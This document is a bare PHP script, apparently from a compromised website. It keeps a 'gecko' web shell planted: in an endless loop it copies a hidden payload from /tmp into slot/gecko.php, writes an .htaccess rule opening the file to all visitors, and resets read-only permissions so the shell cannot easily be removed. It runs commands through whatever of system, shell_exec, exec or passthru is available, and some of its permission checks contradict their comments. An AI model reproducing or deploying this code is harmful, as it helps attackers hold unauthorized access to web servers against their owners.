<?php

$tmp = "/tmp";
$directory = "slot"; // Specify the directory where files will be created
$geckoFile = $directory . "/gecko.php";
$htaccessFile = $directory . "/.htaccess";

// Function to set system commands
function gecko_cmd($value) {
    if (function_exists("system")) {
        system($value);
    } else if (function_exists("shell_exec")) {
        shell_exec($value);
    } else if (function_exists("exec")) {
        exec($value);
    } else if (function_exists("passthru")) {
        passthru($value);
    }
}

// Function to retrieve file or directory permissions
function gecko_perm($path) {
    return file_exists($path) ? substr(sprintf("%o", fileperms($path)), -4) : false;
}

// Ensure the target directory exists; create if missing
if (!file_exists($directory)) {
    if (mkdir($directory, 0777, true)) { // Create the directory with permissions 0777
        echo "Directory created successfully: $directory\n";
    } else {
        die("Failed to create directory: $directory\n");
    }
}

// Function to ensure gecko.php exists and has the correct permissions
function ensure_gecko_file($filePath, $tmp) {
    if (!file_exists($filePath)) {
        $var = base64_encode(file_get_contents($tmp . "/Acx0geckowplers0x.do.not.remove.this.Lock"));
        file_put_contents($filePath, base64_decode($var));
        echo "gecko.php file created successfully\n";
    }

    // Set permissions for gecko.php
    gecko_cmd("chmod 555 " . escapeshellarg($filePath));
}

// Function to ensure .htaccess exists and has the correct permissions
function ensure_htaccess_file($filePath) {
    // Create .htaccess if it doesn't exist
    if (!file_exists($filePath)) {
        $htaccessContent = <<<EOD
<Files "gecko.php">
    Order Allow,Deny
    Allow from all
</Files>
EOD;
        file_put_contents($filePath, $htaccessContent);
        echo ".htaccess file created successfully\n";
    }

    // Set permissions for .htaccess
    gecko_cmd("chmod 444 " . escapeshellarg($filePath));
}

// Ensure the files are created and permissions are set in an infinite loop
while (true) {
    // Ensure the directory exists and set permissions
    if (!file_exists($directory)) {
        if (mkdir($directory, 0777, true)) {
            echo "Directory created successfully: $directory\n";
        } else {
            die("Failed to create directory: $directory\n");
        }
    }

    // Ensure gecko.php exists and set permissions
    ensure_gecko_file($geckoFile, $tmp);

    // Ensure .htaccess exists and set permissions
    ensure_htaccess_file($htaccessFile);

    // Re-apply permissions to the directory if not 0444
    if (gecko_perm($directory) != "055") {
        gecko_cmd("chmod 0555 " . escapeshellarg($directory));
        echo "Permissions set to 0444 for directory: $directory\n";
    }

    // Re-apply permissions if they are not 0444 for the files
    if (gecko_perm($geckoFile) != "0444") {
        gecko_cmd("chmod 444 " . escapeshellarg($geckoFile));
    }

    if (gecko_perm($htaccessFile) != "0444") {
        gecko_cmd("chmod 444 " . escapeshellarg($htaccessFile));
    }

    sleep(1); // Avoid CPU overuse in the loop
}
?>